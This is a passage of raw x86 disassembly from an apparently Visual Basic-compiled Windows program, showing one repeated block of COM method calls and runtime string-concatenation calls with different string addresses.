  406481:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  406487:	50                   	push   %eax
  406488:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40648b:	50                   	push   %eax
  40648c:	ff d3                	call   *%ebx
  40648e:	8b 0e                	mov    (%esi),%ecx
  406490:	56                   	push   %esi
  406491:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406497:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  40649d:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  4064a0:	50                   	push   %eax
  4064a1:	52                   	push   %edx
  4064a2:	ff d3                	call   *%ebx
  4064a4:	8b f8                	mov    %eax,%edi
  4064a6:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4064a9:	51                   	push   %ecx
  4064aa:	57                   	push   %edi
  4064ab:	8b 07                	mov    (%edi),%eax
  4064ad:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  4064b3:	85 c0                	test   %eax,%eax
  4064b5:	db e2                	fnclex
  4064b7:	7d 12                	jge    0x4064cb
  4064b9:	68 a0 00 00 00       	push   $0xa0
  4064be:	68 38 30 40 00       	push   $0x403038
  4064c3:	57                   	push   %edi
  4064c4:	50                   	push   %eax
  4064c5:	ff 15 38 10 40 00    	call   *0x401038
  4064cb:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4064ce:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  4064d4:	50                   	push   %eax
  4064d5:	68 20 32 40 00       	push   $0x403220
  4064da:	8b 3a                	mov    (%edx),%edi
  4064dc:	ff 15 28 10 40 00    	call   *0x401028
  4064e2:	8b d0                	mov    %eax,%edx
  4064e4:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4064e7:	ff 15 38 11 40 00    	call   *0x401138
  4064ed:	8b cf                	mov    %edi,%ecx
  4064ef:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4064f5:	50                   	push   %eax
  4064f6:	57                   	push   %edi
  4064f7:	e9 8b 26 00 00       	jmp    0x408b87
  4064fc:	8b 06                	mov    (%esi),%eax
  4064fe:	56                   	push   %esi
  4064ff:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  406505:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  406508:	50                   	push   %eax
  406509:	51                   	push   %ecx
  40650a:	ff d3                	call   *%ebx
  40650c:	8b 16                	mov    (%esi),%edx
  40650e:	56                   	push   %esi
  40650f:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406515:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  40651b:	50                   	push   %eax
  40651c:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  40651f:	50                   	push   %eax
  406520:	ff d3                	call   *%ebx
  406522:	8b f8                	mov    %eax,%edi
  406524:	8d 55 dc             	lea    -0x24(%ebp),%edx
  406527:	52                   	push   %edx
  406528:	57                   	push   %edi
  406529:	8b 0f                	mov    (%edi),%ecx
  40652b:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  406531:	85 c0                	test   %eax,%eax
  406533:	db e2                	fnclex
  406535:	7d 12                	jge    0x406549
  406537:	68 a0 00 00 00       	push   $0xa0
  40653c:	68 38 30 40 00       	push   $0x403038
  406541:	57                   	push   %edi
  406542:	50                   	push   %eax
  406543:	ff 15 38 10 40 00    	call   *0x401038
  406549:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40654c:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  406552:	51                   	push   %ecx
  406553:	68 28 32 40 00       	push   $0x403228
  406558:	8b 38                	mov    (%eax),%edi
  40655a:	ff 15 28 10 40 00    	call   *0x401028
  406560:	8b d0                	mov    %eax,%edx
  406562:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  406565:	ff 15 38 11 40 00    	call   *0x401138
  40656b:	8b d7                	mov    %edi,%edx
  40656d:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  406573:	50                   	push   %eax
  406574:	57                   	push   %edi
  406575:	e9 57 fe ff ff       	jmp    0x4063d1
  40657a:	8b 0e                	mov    (%esi),%ecx
  40657c:	56                   	push   %esi
  40657d:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  406583:	8d 55 d0             	lea    -0x30(%ebp),%edx
  406586:	50                   	push   %eax
  406587:	52                   	push   %edx
  406588:	ff d3                	call   *%ebx
  40658a:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406590:	8b 06                	mov    (%esi),%eax
  406592:	56                   	push   %esi
  406593:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  406599:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  40659c:	50                   	push   %eax
  40659d:	51                   	push   %ecx
  40659e:	ff d3                	call   *%ebx
  4065a0:	8b f8                	mov    %eax,%edi
  4065a2:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4065a5:	50                   	push   %eax
  4065a6:	57                   	push   %edi
  4065a7:	8b 17                	mov    (%edi),%edx
  4065a9:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  4065af:	85 c0                	test   %eax,%eax
  4065b1:	db e2                	fnclex
  4065b3:	7d 12                	jge    0x4065c7
  4065b5:	68 a0 00 00 00       	push   $0xa0
  4065ba:	68 38 30 40 00       	push   $0x403038
  4065bf:	57                   	push   %edi
  4065c0:	50                   	push   %eax
  4065c1:	ff 15 38 10 40 00    	call   *0x401038
  4065c7:	8b 55 dc             	mov    -0x24(%ebp),%edx
  4065ca:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  4065d0:	52                   	push   %edx
  4065d1:	68 30 32 40 00       	push   $0x403230
  4065d6:	8b 39                	mov    (%ecx),%edi
  4065d8:	ff 15 28 10 40 00    	call   *0x401028
  4065de:	8b d0                	mov    %eax,%edx
  4065e0:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4065e3:	ff 15 38 11 40 00    	call   *0x401138
  4065e9:	89 bd a4 fe ff ff    	mov    %edi,-0x15c(%ebp)
  4065ef:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4065f5:	50                   	push   %eax
  4065f6:	8b 85 a4 fe ff ff    	mov    -0x15c(%ebp),%eax
  4065fc:	57                   	push   %edi
  4065fd:	e9 67 fe ff ff       	jmp    0x406469
  406602:	8b 16                	mov    (%esi),%edx
  406604:	56                   	push   %esi
  406605:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  40660b:	50                   	push   %eax
  40660c:	8d 45 d0             	lea    -0x30(%ebp),%eax
  40660f:	50                   	push   %eax
  406610:	ff d3                	call   *%ebx
  406612:	8b 0e                	mov    (%esi),%ecx
  406614:	56                   	push   %esi
  406615:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40661b:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  406621:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  406624:	50                   	push   %eax
  406625:	52                   	push   %edx
  406626:	ff d3                	call   *%ebx
  406628:	8b f8                	mov    %eax,%edi
  40662a:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  40662d:	51                   	push   %ecx
  40662e:	57                   	push   %edi
  40662f:	8b 07                	mov    (%edi),%eax
  406631:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  406637:	85 c0                	test   %eax,%eax
  406639:	db e2                	fnclex
  40663b:	7d 12                	jge    0x40664f
  40663d:	68 a0 00 00 00       	push   $0xa0
  406642:	68 38 30 40 00       	push   $0x403038
  406647:	57                   	push   %edi
  406648:	50                   	push   %eax
  406649:	ff 15 38 10 40 00    	call   *0x401038
  40664f:	8b 45 dc             	mov    -0x24(%ebp),%eax
  406652:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  406658:	50                   	push   %eax
  406659:	68 38 32 40 00       	push   $0x403238
  40665e:	8b 3a                	mov    (%edx),%edi
  406660:	ff 15 28 10 40 00    	call   *0x401028
  406666:	8b d0                	mov    %eax,%edx
  406668:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40666b:	ff 15 38 11 40 00    	call   *0x401138
  406671:	8b cf                	mov    %edi,%ecx
  406673:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  406679:	50                   	push   %eax
  40667a:	57                   	push   %edi
  40667b:	e9 07 25 00 00       	jmp    0x408b87
  406680:	8b 06                	mov    (%esi),%eax
  406682:	56                   	push   %esi
  406683:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  406689:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  40668c:	50                   	push   %eax
  40668d:	51                   	push   %ecx
  40668e:	ff d3                	call   *%ebx
  406690:	8b 16                	mov    (%esi),%edx
  406692:	56                   	push   %esi
  406693:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406699:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  40669f:	50                   	push   %eax
  4066a0:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  4066a3:	50                   	push   %eax
  4066a4:	ff d3                	call   *%ebx
  4066a6:	8b f8                	mov    %eax,%edi
  4066a8:	8d 55 dc             	lea    -0x24(%ebp),%edx
  4066ab:	52                   	push   %edx
  4066ac:	57                   	push   %edi
  4066ad:	8b 0f                	mov    (%edi),%ecx
  4066af:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  4066b5:	85 c0                	test   %eax,%eax
  4066b7:	db e2                	fnclex
  4066b9:	7d 12                	jge    0x4066cd
  4066bb:	68 a0 00 00 00       	push   $0xa0
  4066c0:	68 38 30 40 00       	push   $0x403038
  4066c5:	57                   	push   %edi
  4066c6:	50                   	push   %eax
  4066c7:	ff 15 38 10 40 00    	call   *0x401038
  4066cd:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4066d0:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  4066d6:	51                   	push   %ecx
  4066d7:	68 40 32 40 00       	push   $0x403240
  4066dc:	8b 38                	mov    (%eax),%edi
  4066de:	ff 15 28 10 40 00    	call   *0x401028
  4066e4:	8b d0                	mov    %eax,%edx
  4066e6:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4066e9:	ff 15 38 11 40 00    	call   *0x401138
  4066ef:	8b d7                	mov    %edi,%edx
  4066f1:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4066f7:	50                   	push   %eax
  4066f8:	57                   	push   %edi
  4066f9:	e9 d3 fc ff ff       	jmp    0x4063d1
  4066fe:	8b 0e                	mov    (%esi),%ecx
  406700:	56                   	push   %esi
  406701:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  406707:	8d 55 d0             	lea    -0x30(%ebp),%edx
  40670a:	50                   	push   %eax
  40670b:	52                   	push   %edx
  40670c:	ff d3                	call   *%ebx
  40670e:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406714:	8b 06                	mov    (%esi),%eax
  406716:	56                   	push   %esi
  406717:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  40671d:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  406720:	50                   	push   %eax
  406721:	51                   	push   %ecx
  406722:	ff d3                	call   *%ebx
  406724:	8b f8                	mov    %eax,%edi
  406726:	8d 45 dc             	lea    -0x24(%ebp),%eax
  406729:	50                   	push   %eax
  40672a:	57                   	push   %edi
  40672b:	8b 17                	mov    (%edi),%edx
  40672d:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  406733:	85 c0                	test   %eax,%eax
  406735:	db e2                	fnclex
  406737:	7d 12                	jge    0x40674b
  406739:	68 a0 00 00 00       	push   $0xa0
  40673e:	68 38 30 40 00       	push   $0x403038
  406743:	57                   	push   %edi
  406744:	50                   	push   %eax
  406745:	ff 15 38 10 40 00    	call   *0x401038
  40674b:	8b 55 dc             	mov    -0x24(%ebp),%edx
  40674e:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  406754:	52                   	push   %edx
  406755:	68 48 32 40 00       	push   $0x403248
  40675a:	8b 39                	mov    (%ecx),%edi
  40675c:	ff 15 28 10 40 00    	call   *0x401028
  406762:	8b d0                	mov    %eax,%edx
  406764:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  406767:	ff 15 38 11 40 00    	call   *0x401138
  40676d:	89 bd 98 fe ff ff    	mov    %edi,-0x168(%ebp)
  406773:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  406779:	50                   	push   %eax
  40677a:	8b 85 98 fe ff ff    	mov    -0x168(%ebp),%eax
  406780:	57                   	push   %edi
  406781:	e9 e3 fc ff ff       	jmp    0x406469
  406786:	8b 16                	mov    (%esi),%edx
  406788:	56                   	push   %esi
  406789:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  40678f:	50                   	push   %eax
  406790:	8d 45 d0             	lea    -0x30(%ebp),%eax
  406793:	50                   	push   %eax
  406794:	ff d3                	call   *%ebx
  406796:	8b 0e                	mov    (%esi),%ecx
  406798:	56                   	push   %esi
  406799:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40679f:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  4067a5:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  4067a8:	50                   	push   %eax
  4067a9:	52                   	push   %edx
  4067aa:	ff d3                	call   *%ebx
  4067ac:	8b f8                	mov    %eax,%edi
  4067ae:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  4067b1:	51                   	push   %ecx
  4067b2:	57                   	push   %edi
  4067b3:	8b 07                	mov    (%edi),%eax
  4067b5:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  4067bb:	85 c0                	test   %eax,%eax
  4067bd:	db e2                	fnclex
  4067bf:	7d 12                	jge    0x4067d3
  4067c1:	68 a0 00 00 00       	push   $0xa0
  4067c6:	68 38 30 40 00       	push   $0x403038
  4067cb:	57                   	push   %edi
  4067cc:	50                   	push   %eax
  4067cd:	ff 15 38 10 40 00    	call   *0x401038
  4067d3:	8b 45 dc             	mov    -0x24(%ebp),%eax
  4067d6:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  4067dc:	50                   	push   %eax
  4067dd:	68 50 32 40 00       	push   $0x403250
  4067e2:	8b 3a                	mov    (%edx),%edi
  4067e4:	ff 15 28 10 40 00    	call   *0x401028
  4067ea:	8b d0                	mov    %eax,%edx
  4067ec:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4067ef:	ff 15 38 11 40 00    	call   *0x401138
  4067f5:	8b cf                	mov    %edi,%ecx
  4067f7:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4067fd:	50                   	push   %eax
  4067fe:	57                   	push   %edi
  4067ff:	e9 83 23 00 00       	jmp    0x408b87
  406804:	8b 06                	mov    (%esi),%eax
  406806:	56                   	push   %esi
  406807:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  40680d:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  406810:	50                   	push   %eax
  406811:	51                   	push   %ecx
  406812:	ff d3                	call   *%ebx
  406814:	8b 16                	mov    (%esi),%edx
  406816:	56                   	push   %esi
  406817:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  40681d:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  406823:	50                   	push   %eax
  406824:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  406827:	50                   	push   %eax
  406828:	ff d3                	call   *%ebx
  40682a:	8b f8                	mov    %eax,%edi
  40682c:	8d 55 dc             	lea    -0x24(%ebp),%edx
  40682f:	52                   	push   %edx
  406830:	57                   	push   %edi
  406831:	8b 0f                	mov    (%edi),%ecx
  406833:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  406839:	85 c0                	test   %eax,%eax
  40683b:	db e2                	fnclex
  40683d:	7d 12                	jge    0x406851
  40683f:	68 a0 00 00 00       	push   $0xa0
  406844:	68 38 30 40 00       	push   $0x403038
  406849:	57                   	push   %edi
  40684a:	50                   	push   %eax
  40684b:	ff 15 38 10 40 00    	call   *0x401038
  406851:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  406854:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  40685a:	51                   	push   %ecx
  40685b:	68 58 32 40 00       	push   $0x403258
  406860:	8b 38                	mov    (%eax),%edi
  406862:	ff 15 28 10 40 00    	call   *0x401028
  406868:	8b d0                	mov    %eax,%edx
  40686a:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  40686d:	ff 15 38 11 40 00    	call   *0x401138
  406873:	8b d7                	mov    %edi,%edx
  406875:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  40687b:	50                   	push   %eax
  40687c:	57                   	push   %edi
  40687d:	e9 4f fb ff ff       	jmp    0x4063d1
  406882:	8b 0e                	mov    (%esi),%ecx
  406884:	56                   	push   %esi
  406885:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  40688b:	8d 55 d0             	lea    -0x30(%ebp),%edx
  40688e:	50                   	push   %eax
  40688f:	52                   	push   %edx
  406890:	ff d3                	call   *%ebx
  406892:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406898:	8b 06                	mov    (%esi),%eax
  40689a:	56                   	push   %esi
  40689b:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  4068a1:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  4068a4:	50                   	push   %eax
  4068a5:	51                   	push   %ecx
  4068a6:	ff d3                	call   *%ebx
  4068a8:	8b f8                	mov    %eax,%edi
  4068aa:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4068ad:	50                   	push   %eax
  4068ae:	57                   	push   %edi
  4068af:	8b 17                	mov    (%edi),%edx
  4068b1:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  4068b7:	85 c0                	test   %eax,%eax
  4068b9:	db e2                	fnclex
  4068bb:	7d 12                	jge    0x4068cf
  4068bd:	68 a0 00 00 00       	push   $0xa0
  4068c2:	68 38 30 40 00       	push   $0x403038
  4068c7:	57                   	push   %edi
  4068c8:	50                   	push   %eax
  4068c9:	ff 15 38 10 40 00    	call   *0x401038
  4068cf:	8b 55 dc             	mov    -0x24(%ebp),%edx
  4068d2:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  4068d8:	52                   	push   %edx
  4068d9:	68 60 32 40 00       	push   $0x403260
  4068de:	8b 39                	mov    (%ecx),%edi
  4068e0:	ff 15 28 10 40 00    	call   *0x401028
  4068e6:	8b d0                	mov    %eax,%edx
  4068e8:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4068eb:	ff 15 38 11 40 00    	call   *0x401138
  4068f1:	89 bd 8c fe ff ff    	mov    %edi,-0x174(%ebp)
  4068f7:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4068fd:	50                   	push   %eax
  4068fe:	8b 85 8c fe ff ff    	mov    -0x174(%ebp),%eax
  406904:	57                   	push   %edi
  406905:	e9 5f fb ff ff       	jmp    0x406469
  40690a:	8b 16                	mov    (%esi),%edx
  40690c:	56                   	push   %esi
  40690d:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  406913:	50                   	push   %eax
  406914:	8d 45 d0             	lea    -0x30(%ebp),%eax
  406917:	50                   	push   %eax
  406918:	ff d3                	call   *%ebx
  40691a:	8b 0e                	mov    (%esi),%ecx
  40691c:	56                   	push   %esi
  40691d:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406923:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  406929:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  40692c:	50                   	push   %eax
  40692d:	52                   	push   %edx
  40692e:	ff d3                	call   *%ebx
  406930:	8b f8                	mov    %eax,%edi
  406932:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  406935:	51                   	push   %ecx
  406936:	57                   	push   %edi
  406937:	8b 07                	mov    (%edi),%eax
  406939:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  40693f:	85 c0                	test   %eax,%eax
  406941:	db e2                	fnclex
  406943:	7d 12                	jge    0x406957
  406945:	68 a0 00 00 00       	push   $0xa0
  40694a:	68 38 30 40 00       	push   $0x403038
  40694f:	57                   	push   %edi
  406950:	50                   	push   %eax
  406951:	ff 15 38 10 40 00    	call   *0x401038
  406957:	8b 45 dc             	mov    -0x24(%ebp),%eax
  40695a:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  406960:	50                   	push   %eax
  406961:	68 68 32 40 00       	push   $0x403268
  406966:	8b 3a                	mov    (%edx),%edi
  406968:	ff 15 28 10 40 00    	call   *0x401028
  40696e:	8b d0                	mov    %eax,%edx
  406970:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  406973:	ff 15 38 11 40 00    	call   *0x401138
  406979:	8b cf                	mov    %edi,%ecx
  40697b:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  406981:	50                   	push   %eax
  406982:	57                   	push   %edi
  406983:	e9 ff 21 00 00       	jmp    0x408b87
  406988:	8b 06                	mov    (%esi),%eax
  40698a:	56                   	push   %esi
  40698b:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  406991:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  406994:	50                   	push   %eax
  406995:	51                   	push   %ecx
  406996:	ff d3                	call   *%ebx
  406998:	8b 16                	mov    (%esi),%edx
  40699a:	56                   	push   %esi
  40699b:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  4069a1:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  4069a7:	50                   	push   %eax
  4069a8:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  4069ab:	50                   	push   %eax
  4069ac:	ff d3                	call   *%ebx
  4069ae:	8b f8                	mov    %eax,%edi
  4069b0:	8d 55 dc             	lea    -0x24(%ebp),%edx
  4069b3:	52                   	push   %edx
  4069b4:	57                   	push   %edi
  4069b5:	8b 0f                	mov    (%edi),%ecx
  4069b7:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  4069bd:	85 c0                	test   %eax,%eax
  4069bf:	db e2                	fnclex
  4069c1:	7d 12                	jge    0x4069d5
  4069c3:	68 a0 00 00 00       	push   $0xa0
  4069c8:	68 38 30 40 00       	push   $0x403038
  4069cd:	57                   	push   %edi
  4069ce:	50                   	push   %eax
  4069cf:	ff 15 38 10 40 00    	call   *0x401038
  4069d5:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  4069d8:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  4069de:	51                   	push   %ecx
  4069df:	68 70 32 40 00       	push   $0x403270
  4069e4:	8b 38                	mov    (%eax),%edi
  4069e6:	ff 15 28 10 40 00    	call   *0x401028
  4069ec:	8b d0                	mov    %eax,%edx
  4069ee:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  4069f1:	ff 15 38 11 40 00    	call   *0x401138
  4069f7:	8b d7                	mov    %edi,%edx
  4069f9:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  4069ff:	50                   	push   %eax
  406a00:	57                   	push   %edi
  406a01:	e9 cb f9 ff ff       	jmp    0x4063d1
  406a06:	8b 0e                	mov    (%esi),%ecx
  406a08:	56                   	push   %esi
  406a09:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  406a0f:	8d 55 d0             	lea    -0x30(%ebp),%edx
  406a12:	50                   	push   %eax
  406a13:	52                   	push   %edx
  406a14:	ff d3                	call   *%ebx
  406a16:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406a1c:	8b 06                	mov    (%esi),%eax
  406a1e:	56                   	push   %esi
  406a1f:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  406a25:	8d 4d d4             	lea    -0x2c(%ebp),%ecx
  406a28:	50                   	push   %eax
  406a29:	51                   	push   %ecx
  406a2a:	ff d3                	call   *%ebx
  406a2c:	8b f8                	mov    %eax,%edi
  406a2e:	8d 45 dc             	lea    -0x24(%ebp),%eax
  406a31:	50                   	push   %eax
  406a32:	57                   	push   %edi
  406a33:	8b 17                	mov    (%edi),%edx
  406a35:	ff 92 a0 00 00 00    	call   *0xa0(%edx)
  406a3b:	85 c0                	test   %eax,%eax
  406a3d:	db e2                	fnclex
  406a3f:	7d 12                	jge    0x406a53
  406a41:	68 a0 00 00 00       	push   $0xa0
  406a46:	68 38 30 40 00       	push   $0x403038
  406a4b:	57                   	push   %edi
  406a4c:	50                   	push   %eax
  406a4d:	ff 15 38 10 40 00    	call   *0x401038
  406a53:	8b 55 dc             	mov    -0x24(%ebp),%edx
  406a56:	8b 8d 40 ff ff ff    	mov    -0xc0(%ebp),%ecx
  406a5c:	52                   	push   %edx
  406a5d:	68 78 32 40 00       	push   $0x403278
  406a62:	8b 39                	mov    (%ecx),%edi
  406a64:	ff 15 28 10 40 00    	call   *0x401028
  406a6a:	8b d0                	mov    %eax,%edx
  406a6c:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  406a6f:	ff 15 38 11 40 00    	call   *0x401138
  406a75:	89 bd 80 fe ff ff    	mov    %edi,-0x180(%ebp)
  406a7b:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  406a81:	50                   	push   %eax
  406a82:	8b 85 80 fe ff ff    	mov    -0x180(%ebp),%eax
  406a88:	57                   	push   %edi
  406a89:	e9 db f9 ff ff       	jmp    0x406469
  406a8e:	8b 16                	mov    (%esi),%edx
  406a90:	56                   	push   %esi
  406a91:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  406a97:	50                   	push   %eax
  406a98:	8d 45 d0             	lea    -0x30(%ebp),%eax
  406a9b:	50                   	push   %eax
  406a9c:	ff d3                	call   *%ebx
  406a9e:	8b 0e                	mov    (%esi),%ecx
  406aa0:	56                   	push   %esi
  406aa1:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406aa7:	ff 91 0c 03 00 00    	call   *0x30c(%ecx)
  406aad:	8d 55 d4             	lea    -0x2c(%ebp),%edx
  406ab0:	50                   	push   %eax
  406ab1:	52                   	push   %edx
  406ab2:	ff d3                	call   *%ebx
  406ab4:	8b f8                	mov    %eax,%edi
  406ab6:	8d 4d dc             	lea    -0x24(%ebp),%ecx
  406ab9:	51                   	push   %ecx
  406aba:	57                   	push   %edi
  406abb:	8b 07                	mov    (%edi),%eax
  406abd:	ff 90 a0 00 00 00    	call   *0xa0(%eax)
  406ac3:	85 c0                	test   %eax,%eax
  406ac5:	db e2                	fnclex
  406ac7:	7d 12                	jge    0x406adb
  406ac9:	68 a0 00 00 00       	push   $0xa0
  406ace:	68 38 30 40 00       	push   $0x403038
  406ad3:	57                   	push   %edi
  406ad4:	50                   	push   %eax
  406ad5:	ff 15 38 10 40 00    	call   *0x401038
  406adb:	8b 45 dc             	mov    -0x24(%ebp),%eax
  406ade:	8b 95 40 ff ff ff    	mov    -0xc0(%ebp),%edx
  406ae4:	50                   	push   %eax
  406ae5:	68 80 32 40 00       	push   $0x403280
  406aea:	8b 3a                	mov    (%edx),%edi
  406aec:	ff 15 28 10 40 00    	call   *0x401028
  406af2:	8b d0                	mov    %eax,%edx
  406af4:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  406af7:	ff 15 38 11 40 00    	call   *0x401138
  406afd:	8b cf                	mov    %edi,%ecx
  406aff:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  406b05:	50                   	push   %eax
  406b06:	57                   	push   %edi
  406b07:	e9 7b 20 00 00       	jmp    0x408b87
  406b0c:	8b 06                	mov    (%esi),%eax
  406b0e:	56                   	push   %esi
  406b0f:	ff 90 0c 03 00 00    	call   *0x30c(%eax)
  406b15:	8d 4d d0             	lea    -0x30(%ebp),%ecx
  406b18:	50                   	push   %eax
  406b19:	51                   	push   %ecx
  406b1a:	ff d3                	call   *%ebx
  406b1c:	8b 16                	mov    (%esi),%edx
  406b1e:	56                   	push   %esi
  406b1f:	89 85 40 ff ff ff    	mov    %eax,-0xc0(%ebp)
  406b25:	ff 92 0c 03 00 00    	call   *0x30c(%edx)
  406b2b:	50                   	push   %eax
  406b2c:	8d 45 d4             	lea    -0x2c(%ebp),%eax
  406b2f:	50                   	push   %eax
  406b30:	ff d3                	call   *%ebx
  406b32:	8b f8                	mov    %eax,%edi
  406b34:	8d 55 dc             	lea    -0x24(%ebp),%edx
  406b37:	52                   	push   %edx
  406b38:	57                   	push   %edi
  406b39:	8b 0f                	mov    (%edi),%ecx
  406b3b:	ff 91 a0 00 00 00    	call   *0xa0(%ecx)
  406b41:	85 c0                	test   %eax,%eax
  406b43:	db e2                	fnclex
  406b45:	7d 12                	jge    0x406b59
  406b47:	68 a0 00 00 00       	push   $0xa0
  406b4c:	68 38 30 40 00       	push   $0x403038
  406b51:	57                   	push   %edi
  406b52:	50                   	push   %eax
  406b53:	ff 15 38 10 40 00    	call   *0x401038
  406b59:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  406b5c:	8b 85 40 ff ff ff    	mov    -0xc0(%ebp),%eax
  406b62:	51                   	push   %ecx
  406b63:	68 4c 31 40 00       	push   $0x40314c
  406b68:	8b 38                	mov    (%eax),%edi
  406b6a:	ff 15 28 10 40 00    	call   *0x401028
  406b70:	8b d0                	mov    %eax,%edx
  406b72:	8d 4d d8             	lea    -0x28(%ebp),%ecx
  406b75:	ff 15 38 11 40 00    	call   *0x401138
  406b7b:	8b d7                	mov    %edi,%edx
  406b7d:	8b bd 40 ff ff ff    	mov    -0xc0(%ebp),%edi
  406b83:	50                   	push   %eax
  406b84:	57                   	push   %edi
  406b85:	e9 47 f8 ff ff       	jmp    0x4063d1
  406b8a:	8b 0e                	mov    (%esi),%ecx
  406b8c:	56                   	push   %esi
